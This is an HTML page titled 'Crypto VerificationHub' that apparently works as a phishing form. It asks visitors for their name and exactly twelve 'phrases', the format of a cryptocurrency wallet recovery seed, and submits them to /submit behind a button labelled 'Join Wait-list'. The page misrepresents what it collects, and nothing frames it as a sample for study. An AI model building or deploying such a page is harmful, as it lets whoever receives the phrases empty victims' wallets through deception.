<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Crypto VerificationHub</title>
<style>
body {
    font-family: Arial, sans-serif;
    background-color: #0b0b0b;
    margin: 0;
    padding: 20px;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}
.card {
    background: linear-gradient(180deg, #1e4620, #3a6b3a);
    padding: 25px;
    border-radius: 15px;
    width: 100%;
    max-width: 950px;
    box-shadow: 0 0 20px rgba(0,0,0,0.6);
}
h1 {
    text-align: center;
    color: #d7ffd9;
    margin-bottom: 10px;
}
p.note {
    text-align: center;
    font-style: italic;
    color: #cce5cc;
    margin-bottom: 25px;
}
form {
    display: flex;
    flex-direction: column;
    gap: 15px;
}
.name-row input {
    width: 100%;
    padding: 15px;
    font-size: 18px;
    border-radius: 10px;
    border: none;
    background-color: #0b0b0b;
    color: #d7ffd9;
}
.row {
    display: flex;
    flex-wrap: wrap;
    gap: 15px;
}
.row input {
    flex: 1 1 calc(33.33% - 15px);
    padding: 12px;
    font-size: 16px;
    border-radius: 8px;
    border: none;
    background-color: #0b0b0b;
    color: #d7ffd9;
}
button {
    padding: 15px;
    font-size: 18px;
    background-color: #97c68d;
    border: none;
    border-radius: 10px;
    color: #0b0b0b;
    cursor: pointer;
    transition: 0.3s;
}
button:hover { background-color: #7fa873; }
@media (max-width: 768px) { .row input { flex: 1 1 calc(50% - 15px); } }
@media (max-width: 480px) { .row input { flex: 1 1 100%; } }
</style>
</head>
<body>
<div class="card">
    <h1> Twelve Phrases</h1>
    <p class="note">Please input exactly 12 phrase .</p>
    <form action="/submit" method="POST">
        <div class="name-row">
            <input type="text" name="name" placeholder="Your Name" required>
        </div>
        <div class="row">
            <input type="text" name="code1" placeholder="Phrase 1" required>
            <input type="text" name="code2" placeholder="Phrase 2" required>
            <input type="text" name="code3" placeholder="Phrase 3" required>
        </div>
        <div class="row">
            <input type="text" name="code4" placeholder="Phrase 4" required>
            <input type="text" name="code5" placeholder="Phrase 5" required>
            <input type="text" name="code6" placeholder="Phrase 6" required>
        </div>
        <div class="row">
            <input type="text" name="code7" placeholder="Phrase 7" required>
            <input type="text" name="code8" placeholder="Phrase 8" required>
            <input type="text" name="code9" placeholder="Phrase 9" required>
        </div>
        <div class="row">
            <input type="text" name="code10" placeholder="Phrase 10" required>
            <input type="text" name="code11" placeholder="Phrase 11" required>
            <input type="text" name="code12" placeholder="Phrase 12" required>
        </div>
        <button type="submit">Join Wait-list</button>
    </form>
</div>
</body>
    </html>
